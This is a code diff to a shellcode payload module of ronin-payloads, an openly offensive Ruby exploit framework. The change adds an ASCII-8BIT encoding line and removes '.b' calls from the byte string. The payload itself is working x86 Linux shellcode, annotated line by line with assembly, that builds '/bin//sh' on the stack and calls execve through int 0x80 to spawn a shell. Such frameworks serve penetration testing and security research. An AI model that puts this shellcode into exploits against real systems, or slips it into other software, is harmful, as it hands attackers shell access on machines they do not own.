@@ -1,3 +1,4 @@
+# encoding: ASCII-8BIT
 # frozen_string_literal: true
 #
 # ronin-payloads - A Ruby micro-framework for writing and running exploit
@@ -52,18 +53,18 @@ module Ronin
             # Builds the shellcode.
             #
             def build
-              @payload = "\x99".b +                 # cltd
-                         "\x52".b +                 # push	%edx
-                         "\x68\x6e\x2f\x73\x68".b + # push	$0x68732f6e
-                         "\x68\x2f\x2f\x62\x69".b + # push	$0x69622f2f
-                         "\x89\xe3".b +             # mov	%esp,%ebx
-                         "\x52".b +                 # push	%edx
-                         "\x54".b +                 # push	%esp
-                         "\x53".b +                 # push	%ebx
-                         "\x53".b +                 # push	%ebx
-                         "\x6a\x3b".b +             # push	$0x3b
-                         "\x58".b +                 # pop	%eax
-                         "\xcd\x80".b               # int	$0x80
+              @payload = "\x99" +                 # cltd
+                         "\x52" +                 # push	%edx
+                         "\x68\x6e\x2f\x73\x68" + # push	$0x68732f6e
+                         "\x68\x2f\x2f\x62\x69" + # push	$0x69622f2f
+                         "\x89\xe3" +             # mov	%esp,%ebx
+                         "\x52" +                 # push	%edx
+                         "\x54" +                 # push	%esp
+                         "\x53" +                 # push	%ebx
+                         "\x53" +                 # push	%ebx
+                         "\x6a\x3b" +             # push	$0x3b
+                         "\x58" +                 # pop	%eax
+                         "\xcd\x80"               # int	$0x80
             end
 
           end
